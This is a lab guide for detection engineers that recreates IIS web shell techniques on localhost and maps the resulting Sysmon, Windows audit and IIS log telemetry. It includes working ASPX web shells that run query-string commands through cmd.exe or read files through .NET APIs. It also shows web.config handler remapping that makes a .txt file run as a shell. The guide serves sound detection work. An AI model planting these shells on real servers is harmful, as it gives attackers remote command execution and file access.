# TRR0000 Lab Recreation Guide

## Overview

**Objective:** Recreate each procedure identified in TRR0000 (File-Based Web Shell Execution via IIS) in a controlled lab environment, capture telemetry mapped in the DDM, and validate detection opportunities.

**TRR Reference:** TRR0000 — T1505.003 — File-Based Web Shell Execution via IIS

**Detection Methods:** Detection specifications derived from this lab are documented separately in `TRR0000_Detection_Methods.md`.

---

## Procedures Under Test

| ID | Name | Summary | Key Telemetry |
|----|------|---------|---------------|
| TRR0000.WIN.A | Web Shell with OS Command Execution | ASPX/ASP shell spawns child process (cmd.exe, powershell.exe) via w3wp.exe | Sysmon 1 (ProcessCreate), Win 4688 (ProcessCreate) |
| TRR0000.WIN.B | Web Shell with In-Process Execution | ASPX shell operates exclusively through .NET APIs — no child process | Sysmon 11 (FileCreate), IIS W3C, Win 4663 (SACL) |
| TRR0000.WIN.C | Web Shell via web.config Manipulation | Attacker writes/modifies web.config to change handler mappings | Sysmon 11 (FileCreate), FIM |

---

## Lab Environment

### Requirements

| Component | Minimum | Notes |
|-----------|---------|-------|
| OS | Windows 10 Pro / Windows 11 Pro / Windows Server 2016+ | IIS must be installable via Windows Features |
| .NET Framework | 4.5+ (4.8 preferred) | Required for ASP.NET ASPX execution and `csc.exe` compilation |
| Disk | ~500 MB free | IIS features, Sysmon, test files, log captures |
| Network | Localhost access | All testing uses `http://localhost` — no external network required |

A dedicated VM is recommended but not required. If testing on a machine used for other purposes, create a system restore point before starting (Step 1.1) and restrict IIS bindings to localhost only.

### Network Safety

> **IMPORTANT:** Do not expose IIS to any network beyond localhost unless you are on an isolated lab network. Bind IIS to `127.0.0.1` only, or use a host-only virtual network if testing from a separate attacker VM.

### Optional: Separate Attacker Machine

All test commands in this guide use `Invoke-WebRequest` from the IIS host itself. If you want to test from a separate machine (e.g., a Kali or Linux VM), use `curl` against the IIS host's IP instead of `localhost`. The telemetry results are identical — only the source IP in IIS logs will differ.

---

## Phase 1: IIS Installation & Configuration

### Step 1.1 — Create System Restore Point (Recommended)

If testing on a non-dedicated machine, create a restore point for clean rollback.

```powershell
Checkpoint-Computer -Description "Pre-TRR0000-Lab" -RestorePointType MODIFY_SETTINGS
```

### Step 1.2 — Install IIS with Required Features

Install IIS with all features required for TRR0000 testing via elevated PowerShell:

```powershell
$features = @(
    "IIS-WebServerRole",
    "IIS-WebServer",
    "IIS-CommonHttpFeatures",
    "IIS-DefaultDocument",
    "IIS-DirectoryBrowsing",
    "IIS-HttpErrors",
    "IIS-StaticContent",
    "IIS-HealthAndDiagnostics",
    "IIS-HttpLogging",
    "IIS-LoggingLibraries",
    "IIS-RequestMonitor",
    "IIS-Security",
    "IIS-RequestFiltering",
    "IIS-Performance",
    "IIS-HttpCompressionStatic",
    "IIS-WebServerManagementTools",
    "IIS-ManagementConsole",
    "IIS-ApplicationDevelopment",
    "IIS-ASP",
    "IIS-ASPNET45",
    "IIS-NetFxExtensibility45",
    "IIS-ISAPIExtensions",
    "IIS-ISAPIFilter",
    "IIS-ApplicationInit"
)

Enable-WindowsOptionalFeature -Online -FeatureName $features -All
```

**Expected result:** Installed successfully. A reboot may be required on some systems.

**Why each feature matters (DDM mapping):**

| Feature | Purpose | DDM Relevance |
|---------|---------|---------------|
| IIS-ASP | Classic ASP handler (`*.asp`) | Procedures A/B — classic ASP web shells |
| IIS-ASPNET45 | ASP.NET handler (`*.aspx`) | Procedures A/B/C — ASP.NET web shells |
| IIS-ISAPIExtensions | Required for classic ASP pipeline | Pipeline dependency |
| IIS-ISAPIFilter | Required for ISAPI module chain | Pipeline dependency |
| IIS-ApplicationInit | Application Initialization module | Procedure C — auto-trigger persistence variant |
| IIS-HttpLogging | IIS W3C request logging | Telemetry source across all procedures |
| IIS-ManagementConsole | IIS Manager GUI | Configuration and verification |

### Step 1.3 — Verify IIS Installation

**Service check:**
```powershell
Get-Service W3SVC
```
Expected: W3SVC (World Wide Web Publishing Service) running.

**Browser check:**
```powershell
Start-Process "http://localhost"
```
Expected: Default IIS welcome page displays successfully.

### Step 1.4 — Verify Handler Mappings
```powershell
Import-Module WebAdministration
Get-WebHandler | Format-Table Name, Path, Modules -AutoSize
```

**Key handlers to confirm:**

| Handler Name | Path | Module | DDM Relevance |
|-------------|------|--------|---------------|
| ASPClassic | `*.asp` | IsapiModule | Procedures A/B (classic ASP shells) |
| PageHandlerFactory-ISAPI-4.0_64bit | `*.aspx` | IsapiModule | Procedures A/B/C (classic mode) |
| PageHandlerFactory-Integrated-4.0 | `*.aspx` | ManagedPipelineHandler | Procedures A/B/C (integrated mode) |
| StaticFile | `*` | StaticFileModule | Procedure C exploits this — web.config redirects static extensions to ASP.NET |

---

## Phase 2: Sysmon Deployment

### Step 2.1 — Download Sysmon
```powershell
New-Item -Path "C:\Tools\Sysmon" -ItemType Directory -Force
Invoke-WebRequest -Uri "https://download.sysinternals.com/files/Sysmon.zip" -OutFile "C:\Tools\Sysmon\Sysmon.zip"
Expand-Archive -Path "C:\Tools\Sysmon\Sysmon.zip" -DestinationPath "C:\Tools\Sysmon" -Force
```

Use `Sysmon64.exe` on 64-bit systems. This guide was originally tested with Sysmon v15.15.

### Step 2.2 — Create Custom Sysmon Configuration
**Config file:** `C:\Tools\Sysmon\trr0000_sysmon_config.xml`

This is a focused configuration tailored to TRR0000 DDM telemetry, not a general-purpose config. It uses include-only filters to capture only IIS-related activity.

```powershell
@'
<Sysmon schemaversion="4.90">
  <EventFiltering>
    
    <!-- EVENT ID 1: Process Create -->
    <!-- DDM: Process Spawn operation (Procedure A) -->
    <!-- Captures w3wp.exe spawning child processes -->
    <RuleGroup name="ProcessCreate" groupRelation="or">
      <ProcessCreate onmatch="include">
        <ParentImage condition="image">w3wp.exe</ParentImage>
        <Image condition="image">w3wp.exe</Image>
      </ProcessCreate>
    </RuleGroup>

    <!-- EVENT ID 3: Network Connection -->
    <!-- DDM: Side-effect telemetry for Procedure B (.NET API network calls) -->
    <RuleGroup name="NetworkConnect" groupRelation="or">
      <NetworkConnect onmatch="include">
        <Image condition="image">w3wp.exe</Image>
      </NetworkConnect>
    </RuleGroup>

    <!-- EVENT ID 11: File Create -->
    <!-- DDM: Create New File (Procs A/B), Write Config (Proc C) -->
    <RuleGroup name="FileCreate" groupRelation="or">
      <FileCreate onmatch="include">
        <TargetFilename condition="contains">inetpub</TargetFilename>
        <TargetFilename condition="contains">Temporary ASP.NET Files</TargetFilename>
        <TargetFilename condition="contains">web.config</TargetFilename>
      </FileCreate>
    </RuleGroup>

    <!-- EVENT ID 12/13/14: Registry Events -->
    <!-- DDM: Side-effect telemetry -->
    <RuleGroup name="RegistryEvent" groupRelation="or">
      <RegistryEvent onmatch="include">
        <Image condition="image">w3wp.exe</Image>
      </RegistryEvent>
    </RuleGroup>

    <!-- EVENT ID 23: File Delete -->
    <!-- Useful for cleanup detection -->
    <RuleGroup name="FileDelete" groupRelation="or">
      <FileDelete onmatch="include">
        <TargetFilename condition="contains">inetpub</TargetFilename>
      </FileDelete>
    </RuleGroup>

  </EventFiltering>
</Sysmon>
'@ | Out-File -FilePath "C:\Tools\Sysmon\trr0000_sysmon_config.xml" -Encoding UTF8
```

**Sysmon Event ID to DDM Operation Mapping:**

| Sysmon Event ID | Event Type | DDM Operation | Procedure Coverage |
|----------------|------------|---------------|-------------------|
| 1 | Process Create | Process Spawn | A (primary), C (when shell spawns process) |
| 3 | Network Connection | Side-effect of .NET API calls | B (outbound connections from w3wp.exe) |
| 11 | File Create | Create New File / Write Config | A, B (new file), C (web.config creation) |
| 12/13/14 | Registry Events | Side-effect telemetry | B (registry access via .NET APIs) |
| 23 | File Delete | Cleanup activity | Post-exploitation |

### Step 2.3 — Install Sysmon with Custom Config
```powershell
C:\Tools\Sysmon\Sysmon64.exe -accepteula -i C:\Tools\Sysmon\trr0000_sysmon_config.xml
```

**Verification:**
```powershell
Get-Service Sysmon64
# Status: Running
```

### Step 2.4 — Verify Sysmon Logging

```powershell
Get-WinEvent -LogName "Microsoft-Windows-Sysmon/Operational" -MaxEvents 5 | Format-List Id, TimeCreated, Message
```

Verify Sysmon is capturing events. Some background noise may appear, but the include-only filters target `w3wp.exe` and `inetpub` paths specifically.

---

## Phase 3: Windows Audit Policy Configuration

### Step 3.1 — Enable Process Creation Auditing (Event 4688)
Required for Procedure A — provides an additional telemetry source for process spawn detection alongside Sysmon Event ID 1.

```powershell
# Enable process creation auditing
auditpol /set /subcategory:"Process Creation" /success:enable /failure:enable

# Enable command-line logging in process creation events
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\Audit" /v ProcessCreationIncludeCmdLine_Enabled /t REG_DWORD /d 1 /f
```

**Verification:**
```powershell
auditpol /get /subcategory:"Process Creation"
# Expected: Success and Failure
```

### Step 3.2 — Configure Object Access Auditing & SACL (Event 4663)
Required for Procedure B blind spot coverage — detects file modification of existing files in the web root, which Sysmon 11 does not capture.

```powershell
# Enable object access auditing
auditpol /set /subcategory:"File System" /success:enable /failure:enable

# Set SACL on the IIS web root directory
$acl = Get-Acl "C:\inetpub\wwwroot"
$auditRule = New-Object System.Security.AccessControl.FileSystemAuditRule(
    "Everyone",
    "Write,Delete,ChangePermissions",
    "ContainerInherit,ObjectInherit",
    "None",
    "Success,Failure"
)
$acl.AddAuditRule($auditRule)
Set-Acl "C:\inetpub\wwwroot" $acl
```

**Verification:**
```powershell
(Get-Acl "C:\inetpub\wwwroot" -Audit).Audit | Format-List
# Expected: FileSystemRights = Write, Delete, ChangePermissions
#           AuditFlags = Success, Failure
#           IdentityReference = Everyone
```

### Step 3.3 — Configure IIS W3C Logging

Ensure IIS logs capture the fields needed for web shell request analysis.

Required fields: date, time, s-ip, cs-method, cs-uri-stem, cs-uri-query, s-port, cs(User-Agent), cs(Referer), sc-status, sc-substatus, sc-win32-status, time-taken

The default IIS W3C logging configuration includes all required fields except `cs(Referer)`. The default is sufficient for this lab. To verify or add fields:

```powershell
Import-Module WebAdministration
Get-ItemProperty "IIS:\Sites\Default Web Site" -Name logFile

# Or configure via IIS Manager:
# Sites → Default Web Site → Logging → Select Fields
```

---

## Phase 4: Web Shell Test Files

### Step 4.0 — Create Directory Structure
```powershell
New-Item -Path "C:\inetpub\wwwroot\test_shells" -ItemType Directory -Force
New-Item -Path "C:\inetpub\wwwroot\test_shells\proc_a" -ItemType Directory -Force
New-Item -Path "C:\inetpub\wwwroot\test_shells\proc_b" -ItemType Directory -Force
New-Item -Path "C:\inetpub\wwwroot\test_shells\proc_c1" -ItemType Directory -Force
New-Item -Path "C:\inetpub\wwwroot\test_shells\proc_c2" -ItemType Directory -Force
```

### Step 4.1 — Procedure A Test Shell (OS Command Execution)

**File:** `C:\inetpub\wwwroot\test_shells\proc_a\shell.aspx`

Simple ASPX shell that accepts a `cmd` query parameter and passes it to `cmd.exe /c`. This triggers the Process Spawn operation in the DDM.

```powershell
@'
<%@ Page Language="C#" %>
<%@ Import Namespace="System.Diagnostics" %>
<html>
<body>
<form method="GET">
    <input type="text" name="cmd" size="50" />
    <input type="submit" value="Run" />
</form>
<pre>
<%
    if (Request.QueryString["cmd"] != null)
    {
        ProcessStartInfo psi = new ProcessStartInfo();
        psi.FileName = "cmd.exe";
        psi.Arguments = "/c " + Request.QueryString["cmd"];
        psi.RedirectStandardOutput = true;
        psi.UseShellExecute = false;
        Process p = Process.Start(psi);
        Response.Write(p.StandardOutput.ReadToEnd());
        p.WaitForExit();
    }
%>
</pre>
</body>
</html>
'@ | Out-File -FilePath "C:\inetpub\wwwroot\test_shells\proc_a\shell.aspx" -Encoding UTF8
```

**DDM operations exercised:**
- Create New File (prerequisite) → file placed on disk
- Send HTTP Request → Route Request → Match Handler (`*.aspx` → PageHandlerFactory) → Execute Code → Process Spawn (`w3wp.exe` → `cmd.exe`)

### Step 4.2 — Procedure B Test Shell (In-Process Execution)

**File:** `C:\inetpub\wwwroot\test_shells\proc_b\shell.aspx`

ASPX shell that performs operations exclusively through .NET APIs (directory listing, file read, system info). No child process is spawned — validating the blind spot documented in the TRR.

```powershell
@'
<%@ Page Language="C#" %>
<%@ Import Namespace="System.IO" %>
<html>
<body>
<h3>Procedure B - In-Process Web Shell (.NET API Only)</h3>
<form method="GET">
    Action:
    <select name="action">
        <option value="listdir">List Directory</option>
        <option value="readfile">Read File</option>
        <option value="info">System Info</option>
    </select>
    Path: <input type="text" name="path" size="50" value="C:\inetpub\wwwroot" />
    <input type="submit" value="Execute" />
</form>
<pre>
<%
    string action = Request.QueryString["action"];
    string path = Request.QueryString["path"];

    if (action == "listdir" && path != null)
    {
        try {
            foreach (string d in Directory.GetDirectories(path))
                Response.Write("[DIR]  " + d + "\n");
            foreach (string f in Directory.GetFiles(path))
                Response.Write("[FILE] " + f + " (" + new FileInfo(f).Length + " bytes)\n");
        } catch (Exception ex) {
            Response.Write("Error: " + ex.Message);
        }
    }
    else if (action == "readfile" && path != null)
    {
        try {
            Response.Write(File.ReadAllText(path));
        } catch (Exception ex) {
            Response.Write("Error: " + ex.Message);
        }
    }
    else if (action == "info")
    {
        Response.Write("Machine: " + Environment.MachineName + "\n");
        Response.Write("User: " + Environment.UserName + "\n");
        Response.Write("OS: " + Environment.OSVersion + "\n");
        Response.Write("CLR: " + Environment.Version + "\n");
        Response.Write("Directory: " + Environment.CurrentDirectory + "\n");
    }
%>
</pre>
</body>
</html>
'@ | Out-File -FilePath "C:\inetpub\wwwroot\test_shells\proc_b\shell.aspx" -Encoding UTF8
```

**DDM operations exercised:**
- Create New File (prerequisite) → file placed on disk
- Send HTTP Request → Route Request → Match Handler (`*.aspx` → PageHandlerFactory) → Execute Code → Call .NET API (no process spawn)

### Step 4.3 — Procedure C Test Files (web.config Manipulation)

**Important:** The `<buildProviders>` element can only be defined at the IIS Application level, not in a subdirectory. Convert the test directories to IIS Applications before deploying the web.config files:

```powershell
Import-Module WebAdministration
New-WebApplication -Name "test_shells/proc_c1" -Site "Default Web Site" -PhysicalPath "C:\inetpub\wwwroot\test_shells\proc_c1" -ApplicationPool "DefaultAppPool"
New-WebApplication -Name "test_shells/proc_c2" -Site "Default Web Site" -PhysicalPath "C:\inetpub\wwwroot\test_shells\proc_c2" -ApplicationPool "DefaultAppPool"
```

#### Variant 1 — Custom Handler Mapping (.txt → ASP.NET)

The `web.config` remaps `*.txt` to the ASP.NET `PageHandlerFactory` and registers a build provider. Both elements are required — without the build provider, ASP.NET returns a compilation error.

```powershell
# web.config — remaps .txt to ASP.NET engine with build provider
@'
<?xml version="1.0" encoding="UTF-8"?>
<configuration>
    <system.web>
        <compilation>
            <buildProviders>
                <add extension=".txt" type="System.Web.Compilation.PageBuildProvider" />
            </buildProviders>
        </compilation>
    </system.web>
    <system.webServer>
        <handlers>
            <add name="TxtAsAspx" path="*.txt" verb="*"
                 type="System.Web.UI.PageHandlerFactory"
                 resourceType="File" />
        </handlers>
    </system.webServer>
</configuration>
'@ | Out-File -FilePath "C:\inetpub\wwwroot\test_shells\proc_c1\web.config" -Encoding UTF8

# Web shell disguised as .txt file
@'
<%@ Page Language="C#" %>
<%@ Import Namespace="System.Diagnostics" %>
<pre>
<%
    if (Request.QueryString["cmd"] != null)
    {
        ProcessStartInfo psi = new ProcessStartInfo();
        psi.FileName = "cmd.exe";
        psi.Arguments = "/c " + Request.QueryString["cmd"];
        psi.RedirectStandardOutput = true;
        psi.UseShellExecute = false;
        Process p = Process.Start(psi);
        Response.Write(p.StandardOutput.ReadToEnd());
        p.WaitForExit();
    }
    else
    {
        Response.Write("Procedure C1: This .txt file is executing as ASP.NET code.");
    }
%>
</pre>
'@ | Out-File -FilePath "C:\inetpub\wwwroot\test_shells\proc_c1\readme.txt" -Encoding UTF8
```

**DDM operations exercised:**
- Write Config (prerequisite) → web.config placed, IIS reloads config
- Create New File (prerequisite) → shell file with `.txt` extension
- Send HTTP Request → Route Request → Match Handler (`.txt` now maps to PageHandlerFactory) → Execute Code → Process Spawn

#### Variant 2 — Custom Extension Handler Mapping (.info → ASP.NET)

```powershell
# web.config — maps .info to ASP.NET engine with build provider
@'
<?xml version="1.0" encoding="UTF-8"?>
<configuration>
    <system.web>
        <compilation>
            <buildProviders>
                <add extension=".info" type="System.Web.Compilation.PageBuildProvider" />
            </buildProviders>
        </compilation>
    </system.web>
    <system.webServer>
        <handlers>
            <add name="InfoAsAspx" path="*.info" verb="*"
                 type="System.Web.UI.PageHandlerFactory"
                 resourceType="Unspecified"
                 preCondition="integratedMode" />
        </handlers>
    </system.webServer>
</configuration>
'@ | Out-File -FilePath "C:\inetpub\wwwroot\test_shells\proc_c2\web.config" -Encoding UTF8

# Shell file with .info extension
@'
<%@ Page Language="C#" %>
<pre>
<%
    Response.Write("Procedure C2: Inline handler mapping active.\n");
    Response.Write("Server: " + Environment.MachineName + "\n");
    Response.Write("Time: " + DateTime.Now.ToString() + "\n");
    Response.Write("User: " + System.Security.Principal.WindowsIdentity.GetCurrent().Name + "\n");
%>
</pre>
'@ | Out-File -FilePath "C:\inetpub\wwwroot\test_shells\proc_c2\status.info" -Encoding UTF8
```

**DDM operations exercised:**
- Write Config (prerequisite) → web.config with handler mapping for `.info`
- Create New File (prerequisite) → shell file with `.info` extension
- Send HTTP Request → Route Request → Match Handler (`.info` maps to PageHandlerFactory) → Execute Code → Call .NET API

### Deployed File Summary

| File | Procedure | Purpose |
|------|-----------|---------|
| `test_shells\proc_a\shell.aspx` | A | OS Command Execution |
| `test_shells\proc_b\shell.aspx` | B | In-Process Execution |
| `test_shells\proc_c1\web.config` | C1 | Custom Handler Mapping (.txt) |
| `test_shells\proc_c1\readme.txt` | C1 | Shell disguised as .txt |
| `test_shells\proc_c2\web.config` | C2 | Custom Extension Mapping (.info) |
| `test_shells\proc_c2\status.info` | C2 | Shell with .info extension |

---

## Phase 5: Procedure Execution & Telemetry Validation

### Evidence Collection Approach

**Primary evidence:** Exported log files saved to `C:\Tools\TRR0000_logs\` per procedure. Use the per-procedure capture template in Appendix C.

**Per-procedure isolation:** Clear the Sysmon log (`wevtutil cl "Microsoft-Windows-Sysmon/Operational"`) before each procedure execution to isolate test telemetry.

### Step 5.1 — Baseline Log Snapshot

```powershell
# Clear Sysmon log for clean test telemetry
wevtutil cl "Microsoft-Windows-Sysmon/Operational"

# Create output directory for log captures
New-Item -Path "C:\Tools\TRR0000_logs" -ItemType Directory -Force
```

### Step 5.2 — Execute Procedure A

**Test commands:**
```powershell
Invoke-WebRequest -Uri "http://localhost/test_shells/proc_a/shell.aspx" -UseBasicParsing
Invoke-WebRequest -Uri "http://localhost/test_shells/proc_a/shell.aspx?cmd=whoami" -UseBasicParsing
Invoke-WebRequest -Uri "http://localhost/test_shells/proc_a/shell.aspx?cmd=ipconfig" -UseBasicParsing
```

All three should return HTTP 200. The `whoami` and `ipconfig` commands execute and return output through the web shell.

#### DDM Telemetry Validation — Expected Results

| Telemetry Source | DDM Prediction | Expected Result |
|---|---|---|
| Sysmon 1 (ProcessCreate) | w3wp.exe → cmd.exe | ✅ Both commands captured with full parent-child chain |
| Win 4688 (ProcessCreate) | w3wp.exe → cmd.exe with cmdline | ✅ Full command lines visible |
| Sysmon 11 (FileCreate) | ASP.NET compilation artifacts | ✅ Multiple files in Temporary ASP.NET Files |
| IIS W3C Logs | Request with query string | ✅ `cmd=whoami` and `cmd=ipconfig` in cs-uri-query |
| Win 4663 (Object Access) | File write to web root | ✅ Captured initial shell deployment |

#### What to Look For — Sysmon Event ID 1

Both `cmd.exe` spawns should show this parent-child relationship:

```
Image:              C:\Windows\System32\cmd.exe
CommandLine:        "cmd.exe" /c whoami
User:               IIS APPPOOL\DefaultAppPool
IntegrityLevel:     High
ParentImage:        C:\Windows\System32\inetsrv\w3wp.exe
ParentCommandLine:  c:\windows\system32\inetsrv\w3wp.exe -ap "DefaultAppPool" ...
```

#### What to Look For — Win 4688

```
New Process Name:       C:\Windows\System32\cmd.exe
Creator Process Name:   C:\Windows\System32\inetsrv\w3wp.exe
Process Command Line:   "cmd.exe" /c whoami
Account Name:           DefaultAppPool
Account Domain:         IIS APPPOOL
Token Elevation Type:   TokenElevationTypeDefault (1)
Mandatory Label:        S-1-16-12288
```

Full command text appears in 4688 when command-line logging is enabled (Step 3.1).

#### What to Look For — Sysmon Event ID 11 (Compilation Artifacts)

The first request to `shell.aspx` triggers dynamic compilation by w3wp.exe, producing files in `Temporary ASP.NET Files`:

| File Pattern | Created By | Significance |
|------|-----------|--------------|
| `shell.aspx.*.compiled` | w3wp.exe | Compilation metadata — preserves source extension |
| `App_Web_*.dll` | csc.exe | Compiled assembly |
| `*.cmdline` | w3wp.exe | Compiler arguments |
| `*.out`, `*.err` | w3wp.exe | Compiler stdout/stderr |

#### What to Look For — IIS W3C Logs

```
GET /test_shells/proc_a/shell.aspx -           200  [high time-taken on first request]
GET /test_shells/proc_a/shell.aspx cmd=whoami   200  [lower time-taken]
GET /test_shells/proc_a/shell.aspx cmd=ipconfig 200  [lowest time-taken]
```

The first request takes significantly longer (hundreds of ms) due to compilation overhead. Subsequent requests are much faster. This timing differential is a forensic indicator.

#### Additional Findings

1. **csc.exe spawn:** The C# compiler is spawned by w3wp.exe for first-time ASPX compilation. This is the Compile ASPX sub-operation from the DDM. The `w3wp.exe` → `csc.exe` parent-child relationship is a strong corroborating signal.

2. **BAM Registry key (Sysmon 13):** w3wp.exe triggers a Background Activity Moderator registry write tracking `cmd.exe` execution under the app pool SID. Path: `HKLM\System\CurrentControlSet\Services\bam\State\UserSettings\{AppPool SID}\...\cmd.exe`. BAM entries persist and can prove cmd.exe was executed under the IIS identity even after logs are cleared.

### Step 5.3 — Execute Procedure B

Clear the Sysmon log before execution.

**Test commands:**
```powershell
Invoke-WebRequest -Uri "http://localhost/test_shells/proc_b/shell.aspx?action=listdir&path=C:\inetpub\wwwroot" -UseBasicParsing
Invoke-WebRequest -Uri "http://localhost/test_shells/proc_b/shell.aspx?action=readfile&path=C:\inetpub\wwwroot\iisstart.htm" -UseBasicParsing
Invoke-WebRequest -Uri "http://localhost/test_shells/proc_b/shell.aspx?action=info" -UseBasicParsing
```

All three should return HTTP 200 with valid content. The shell operates entirely through .NET APIs — no child processes.

#### DDM Telemetry Validation — Blind Spot Confirmed

| Telemetry Source | DDM Prediction | Expected Result |
|---|---|---|
| Sysmon 1 (ProcessCreate) | **No events** | ✅ Sysmon log empty after procedure execution |
| Win 4688 (ProcessCreate) | **No new events** | ✅ No w3wp.exe child processes |
| Win 4663 (Object Access) | Possible file access | ❌ **Not triggered** — see SACL analysis below |
| IIS W3C Logs | Requests logged | ✅ All three requests visible with HTTP 200 |

#### SACL Analysis — Important Finding

The SACL does not fire for Procedure B because the SACL audits **Write, Delete, ChangePermissions** — but Procedure B only performs **Read** operations (`Directory.GetDirectories`, `File.ReadAllText`). Adding `ReadData` to the SACL would catch this, but in production that would generate enormous noise from every legitimate page request reading files.

#### Blind Spot Assessment

An attacker running a Procedure B web shell leaves almost no footprint beyond:

1. **Initial file creation** (Sysmon 11) — only if they create a new file, not if they inject into an existing one
2. **IIS request logs** — but with severe classification difficulty
3. **ASP.NET compilation artifacts** (Sysmon 11) — on first access only
4. **Nothing else** — no process creation, no registry, no network, no file access audit

Procedure B evades all process-based detection mechanisms. This is the lowest-visibility scenario in TRR0000.

### Step 5.4 — Execute Procedure C (Both Variants)

Clear the Sysmon log before execution.

**Test commands:**
```powershell
# C1 — .txt file executing as ASP.NET code
Invoke-WebRequest -Uri "http://localhost/test_shells/proc_c1/readme.txt" -UseBasicParsing
Invoke-WebRequest -Uri "http://localhost/test_shells/proc_c1/readme.txt?cmd=whoami" -UseBasicParsing

# C2 — .info file executing as ASP.NET code
Invoke-WebRequest -Uri "http://localhost/test_shells/proc_c2/status.info" -UseBasicParsing
```

All should return HTTP 200. The `.txt` file executes `cmd.exe /c whoami` and the `.info` file returns server information.

**Troubleshooting:** If you get HTTP 500, check the error message. Common failures:

- *"There is no build provider registered for the extension '.txt'"* — The `<buildProviders>` element is missing from web.config
- *"It is an error to use a section registered as allowDefinition='MachineToApplication' beyond application level"* — The directory is not configured as an IIS Application (run the `New-WebApplication` commands from Step 4.3)

#### DDM Telemetry Validation — Expected Results

| Telemetry Source | DDM Prediction | Expected Result |
|---|---|---|
| Sysmon 1 (ProcessCreate) | cmd.exe from C1 whoami | ✅ Parent-child chain identical to Procedure A |
| Sysmon 1 (ProcessCreate) | csc.exe for non-standard extensions | ✅ Separate csc.exe spawn per variant |
| Sysmon 11 (FileCreate) | Compilation artifacts | ✅ `readme.txt.*.compiled` and `status.info.*.compiled` |
| Win 4688 (ProcessCreate) | Process creation with cmdline | ✅ cmd.exe + both csc.exe compilations |
| IIS W3C | Requests to unusual extensions | ✅ `.txt` and `.info` returning 200 |

#### Key Finding — Compilation Artifacts Preserve Source Extension

| Variant | Compilation Artifact Filename |
|---------|-------------------------------|
| C1 (.txt) | `readme.txt.cdcab7d2.compiled` |
| C2 (.info) | `status.info.cdcab7d2.compiled` |

ASP.NET compilation of `.txt` or `.info` files is highly anomalous. There is no legitimate reason for these extensions to appear in `Temporary ASP.NET Files`. The hash portion of the filename will vary, but the source extension is always preserved.

Additional compilation artifacts per variant: `App_Web_*.dll`, `App_Web_*.cs` (generated source), `*.cmdline`, `*.out`, `*.err`, `preStartInitList.web`, `hash\hash.web`.

#### Key Finding — buildProviders Requirement

Lab testing revealed that Procedure C requires **two** web.config elements, not one:

1. **Handler mapping** (`<system.webServer><handlers>`) — routes the extension to `PageHandlerFactory`
2. **Build provider** (`<system.web><compilation><buildProviders>`) — registers `PageBuildProvider` for the extension

The build provider has a **scope constraint**: `<buildProviders>` can only be defined at the IIS Application level. This means Procedure C requires one of:
- The target directory is already configured as an IIS Application
- The attacker can modify the site root's `web.config`
- The attacker can modify `machine.config` (requires SYSTEM access)

This constraint narrows the attack surface and is documented in the TRR's Technical Background section.

#### IIS Log Pattern

If testing without the `New-WebApplication` step first, IIS logs show a 500→200 transition as the attacker iterates on their web.config. This pattern is a forensic indicator of handler manipulation attempts.

### Step 5.5 — Application Initialization Variant (Not Tested)

The Application Initialization variant (auto-trigger via app pool recycle) was not tested in this lab iteration. Testing would require configuring `<applicationInitialization>` in `web.config` with a preload page pointing to the web shell, then recycling the app pool and verifying execution without an external HTTP request. This remains a future exercise.

---

## Appendix A: Cleanup

After testing is complete, reverse all changes:

```powershell
# Remove IIS Applications created for Procedure C
Import-Module WebAdministration
Remove-WebApplication -Name "test_shells/proc_c1" -Site "Default Web Site"
Remove-WebApplication -Name "test_shells/proc_c2" -Site "Default Web Site"

# Remove test web shells
Remove-Item "C:\inetpub\wwwroot\test_shells" -Recurse -Force

# Uninstall Sysmon
C:\Tools\Sysmon\Sysmon64.exe -u

# Revert audit policy
auditpol /set /subcategory:"Process Creation" /success:disable /failure:disable
auditpol /set /subcategory:"File System" /success:disable /failure:disable

# Remove command-line logging
reg delete "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\Audit" /v ProcessCreationIncludeCmdLine_Enabled /f

# Remove SACL from web root
$acl = Get-Acl "C:\inetpub\wwwroot"
$acl.SetSecurityDescriptorSddlForm($acl.Sddl)
Set-Acl "C:\inetpub\wwwroot" $acl

# Optionally uninstall IIS entirely
# Disable-WindowsOptionalFeature -Online -FeatureName IIS-WebServerRole

# Or use the system restore point created in Step 1.1
```

## Appendix B: File Locations

| Item | Path |
|------|------|
| IIS Web Root | `C:\inetpub\wwwroot` |
| IIS Logs | `C:\inetpub\logs\LogFiles\W3SVC1` |
| Sysmon Installation | `C:\Tools\Sysmon` |
| Sysmon Config | `C:\Tools\Sysmon\trr0000_sysmon_config.xml` |
| ASP.NET Temp Files | `C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Temporary ASP.NET Files` |
| Test Shell Directory | `C:\inetpub\wwwroot\test_shells` |
| Log Captures | `C:\Tools\TRR0000_logs` |
| Sysmon Logs | Event Viewer → Applications and Services Logs → Microsoft → Windows → Sysmon → Operational |
| Security Logs | Event Viewer → Windows Logs → Security |

## Appendix C: Telemetry Capture Commands

### Per-Procedure Log Capture Template

After executing a procedure, capture all relevant telemetry. Replace `proc_X` with the procedure identifier (e.g., `proc_a`, `proc_b`).

```powershell
$proc = "proc_a"  # Change per procedure

# Sysmon - all events since last clear
Get-WinEvent -LogName "Microsoft-Windows-Sysmon/Operational" -ErrorAction SilentlyContinue |
    Format-List Id, TimeCreated, Message |
    Out-File "C:\Tools\TRR0000_logs\${proc}_sysmon.txt" -Width 300

# 4688 - process creation filtered to w3wp.exe as parent
Get-WinEvent -LogName "Security" -FilterXPath "*[System[EventID=4688] and EventData[Data[@Name='ParentProcessName']='C:\Windows\System32\inetsrv\w3wp.exe']]" -MaxEvents 20 -ErrorAction SilentlyContinue |
    Format-List TimeCreated, Message |
    Out-File "C:\Tools\TRR0000_logs\${proc}_4688.txt" -Width 300

# 4663 - object access (SACL) - recent events
Get-WinEvent -LogName "Security" -FilterXPath "*[System[EventID=4663]]" -MaxEvents 30 -ErrorAction SilentlyContinue |
    Format-List TimeCreated, Message |
    Out-File "C:\Tools\TRR0000_logs\${proc}_4663.txt" -Width 300

# IIS logs
$iisLog = Get-ChildItem "C:\inetpub\logs\LogFiles\W3SVC1" | Sort-Object LastWriteTime -Descending | Select-Object -First 1
Copy-Item $iisLog.FullName "C:\Tools\TRR0000_logs\${proc}_iis.log"

Get-ChildItem "C:\Tools\TRR0000_logs\${proc}*" | Format-Table Name, Length
```

**Note:** Use the XPath filter for `ParentProcessName` = `w3wp.exe` on 4688 events to isolate IIS-related process creation from background system activity.

### General Commands

```powershell
# View recent Sysmon events
Get-WinEvent -LogName "Microsoft-Windows-Sysmon/Operational" -MaxEvents 20 | Format-List

